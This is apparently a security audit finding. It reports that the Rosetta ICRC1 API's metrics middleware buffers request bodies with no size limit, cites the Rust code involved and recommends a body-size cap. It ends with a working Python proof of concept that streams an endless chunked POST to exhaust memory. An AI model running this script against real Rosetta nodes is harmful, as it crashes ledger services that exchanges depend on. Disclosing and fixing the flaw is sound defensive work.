Audit Report

## Title
Unbounded Body Buffering via `to_bytes(body, usize::MAX)` in `RosettaMetricsMiddleware` Enables Unauthenticated OOM DoS — (`rs/rosetta-api/common/rosetta_core/src/metrics.rs`)

## Summary
`RosettaMetricsMiddleware::call` unconditionally buffers the entire HTTP request body into heap memory with no size cap before any routing or validation occurs. An unauthenticated attacker can exhaust process memory by streaming an arbitrarily large body to any ICRC1 Rosetta POST endpoint, OOM-killing the process and halting all ledger sync operations.

## Finding Description
In `extract_canister_id` at line 389 of `rs/rosetta-api/common/rosetta_core/src/metrics.rs`, the body is consumed with no upper bound:

```rust
let bytes = to_bytes(body, usize::MAX).await?;
``` [1](#0-0) 

This function is called unconditionally from `RosettaMetricsMiddleware::call` for every request that is not `/metrics`:

```rust
let (canister_id, reconstructed_body) = match extract_canister_id(body).await {
    Ok((canister_id, body_bytes)) => (canister_id, Body::from(body_bytes)),
    Err(_) => (None, Body::empty()),
};
``` [2](#0-1) 

The ICRC1 Rosetta Axum router in `rs/rosetta-api/icrc1/src/main.rs` applies `metrics_layer` as the outermost layer with no `RequestBodyLimitLayer` or `DefaultBodyLimit` anywhere in the stack: [3](#0-2) 

By contrast, the IC HTTP endpoint explicitly applies a body size limit before processing: [4](#0-3) 

No equivalent guard exists in the Rosetta ICRC1 stack. The allocation occurs before any routing, authentication, or JSON parsing, meaning the full body is buffered regardless of whether the request is valid.

## Impact Explanation
This is a **High** severity finding matching the allowed impact: *"Application/platform-level DoS, crash, certified-state disruption, or subnet availability impact not based on raw volumetric DDoS."* A single unauthenticated TCP connection with a chunked-transfer body of arbitrary size causes unbounded heap growth, leading to OOM termination of the Rosetta process. This halts ledger synchronization, block queries, and all construction API operations for the affected ICRC1 Rosetta instance. The Rosetta API is an in-scope financial integration component.

## Likelihood Explanation
The Rosetta HTTP port is exchange-facing and typically publicly reachable. No credentials, valid JSON, or prior state are required — a single TCP connection using chunked transfer encoding suffices. The attack is immediately repeatable after process restart, making it a persistent availability threat.

## Recommendation
Replace `usize::MAX` with a bounded limit in `extract_canister_id` in `rs/rosetta-api/common/rosetta_core/src/metrics.rs`:

```rust
const MAX_BODY_SIZE: usize = 10 * 1024 * 1024; // 10 MB
let bytes = to_bytes(body, MAX_BODY_SIZE).await
    .map_err(|_| /* return appropriate error */)?;
```

Alternatively, add `RequestBodyLimitLayer::new(MAX_BODY_SIZE)` to the Axum router in `rs/rosetta-api/icrc1/src/main.rs` **before** `metrics_layer` is applied, mirroring the pattern used in `rs/http_endpoints/public/src/lib.rs`.

## Proof of Concept
```bash
# Stream a large body to the /block endpoint using chunked transfer encoding
python3 -c "
import socket, time
s = socket.create_connection(('rosetta-host', 8080))
s.send(b'POST /block HTTP/1.1\r\nHost: rosetta-host\r\nTransfer-Encoding: chunked\r\nContent-Type: application/json\r\n\r\n')
chunk = b'%x\r\n%s\r\n' % (65536, b'A' * 65536)
while True:
    s.send(chunk)
    time.sleep(0.001)
"
# Monitor: watch -n1 'ps aux | grep rosetta'
# Expected: process RSS grows unboundedly → OOM kill
```

### Citations

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L336-339)
```rust
            let (canister_id, reconstructed_body) = match extract_canister_id(body).await {
                Ok((canister_id, body_bytes)) => (canister_id, Body::from(body_bytes)),
                Err(_) => (None, Body::empty()),
            };
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L385-389)
```rust
async fn extract_canister_id(
    body: Body,
) -> Result<(Option<String>, Bytes), Box<dyn std::error::Error + Send + Sync>> {
    // Read body bytes
    let bytes = to_bytes(body, usize::MAX).await?;
```

**File:** rs/rosetta-api/icrc1/src/main.rs (L361-391)
```rust
    let app = Router::new()
        .route("/ready", get(ready))
        .route("/health", get(health))
        .route("/call", post(call))
        .route("/network/list", post(network_list))
        .route("/network/options", post(network_options))
        .route("/network/status", post(network_status))
        .route("/block", post(block))
        .route("/account/balance", post(account_balance))
        .route("/block/transaction", post(block_transaction))
        .route("/search/transactions", post(search_transactions))
        .route("/mempool", post(mempool))
        .route("/mempool/transaction", post(mempool_transaction))
        .route("/construction/derive", post(construction_derive))
        .route("/construction/preprocess", post(construction_preprocess))
        .route("/construction/metadata", post(construction_metadata))
        .route("/construction/combine", post(construction_combine))
        .route("/construction/submit", post(construction_submit))
        .route("/construction/hash", post(construction_hash))
        .route("/construction/payloads", post(construction_payloads))
        .route("/construction/parse", post(construction_parse))
        // Apply the metrics middleware
        .layer(metrics_layer)
        // This layer creates a span for each http request and attaches
        // the request_id, HTTP Method and path to it.
        .layer(add_request_span())
        // This layer creates a new id for each request and puts it into the
        // request extensions. Note that it should be added after the
        // Trace layer.
        .layer(RequestIdLayer)
        .with_state(token_app_states.clone());
```

**File:** rs/http_endpoints/public/src/lib.rs (L688-691)
```rust
            .layer(DefaultBodyLimit::disable())
            .layer(RequestBodyLimitLayer::new(
                config.max_request_size_bytes as usize,
            ))
```
